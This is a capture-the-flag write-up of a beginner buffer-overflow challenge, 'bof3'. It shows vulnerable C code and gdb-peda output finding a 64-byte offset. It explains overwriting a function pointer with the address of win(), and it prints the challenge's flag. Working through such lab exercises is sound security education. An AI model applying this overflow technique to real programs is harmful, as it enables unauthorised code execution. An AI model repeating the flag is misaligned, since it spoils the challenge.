# 25 points bof3


running on `nc ctf.hackucf.org 9002`

we are given the c code, so the vulnerability is very obvious, its a buffer overflow. If you didn't see that, it's okay, there its a vulnerability in scanf. There is a buffer size of 64 and a pointer to a function called lose. All we have to do is overwrite the address `fp` is pointer to with the address of win

```c
//in main
//functions availaible to returnt to : win & lose
void (*fp)();
char bof[64];

fp = &lose;

scanf("%s",bof);
fp();
```

### when running
```term
bof3$ ./bof3
sdfdasfsd
you suck!
```

#### In gdb

```
gdb-peda$ pattern_create 100 in
Writing pattern of 100 chars to filename "in"
gdb-peda$ r < in
Starting program: bof3 < in

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x41644141 ('AAdA')
EBX: 0xf7fb3000 --> 0x1a9da8
ECX: 0xf7fb48a4 --> 0x0
EDX: 0x1
ESI: 0x0
EDI: 0x0
EBP: 0xffffcb58 ("AA4AAJAAfAA5AAKAAgAA6AAL")
ESP: 0xffffcafc --> 0x80486ca (<main+49>:	mov    eax,0x0)
EIP: 0x41644141 ('AAdA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41644141

```
# the return address is at
EIP: 0x41644141 ('AAdA')

## pattern search this
```
gdb-peda$ pattern offset AAdA
AAdA found at offset: 64
```
the above was just to illustrate what we knew at the start, just for newcomers and illustrate tools I would use if I wasn't sure.


check objdump `$ objdump -M intel -d bof3 > bof3.asm`

find address of win() => `080485cb`

#### note when injecting the address, remember to inject it in Little endian! (see exploit.py)


# end result
```
bof3$ python exploit.py | nc ctf.hackucf.org 9002
flag{KETTLEOFKETCHUP}
```
